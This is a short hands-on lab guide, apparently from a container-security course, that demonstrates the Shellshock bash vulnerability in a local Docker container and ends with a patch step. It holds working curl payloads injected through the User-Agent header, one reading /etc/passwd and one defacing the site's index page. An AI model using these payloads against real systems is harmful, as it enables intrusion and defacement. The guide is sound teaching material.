## Vulnerable/Outdated Libraries

##### Step 1:
* Open Terminal

	![](img/Open-Terminal.png)

##### Step 2:
*  **cd** into  `Labs/3.0.0-Container-Attacks/3.7.0`

    ```commandline
    cd Labs/3.0.0-Container-Attacks/3.7.0
    ```


Shell-Shock (Bash) 
-------------------

Step 1: Run the image vulnerable to shell-shock `docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271`

    Screenshot here
    
Step 2: To exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container, run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://localhost:8080/cgi-bin/stats`

    Screenshot here
    
Step 3: To deface the website, run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable`

    Screenshot here
    
Step 4: Access http://localhost:8080 on browser to confirm.

    Screenshot here
    
Step 5: To fix the vulnerability, update bash by running `docker exec -ti <container_id> /bin/bash -c "apt-get update && apt-get install --only-upgrade bash"`

    Screenshot here
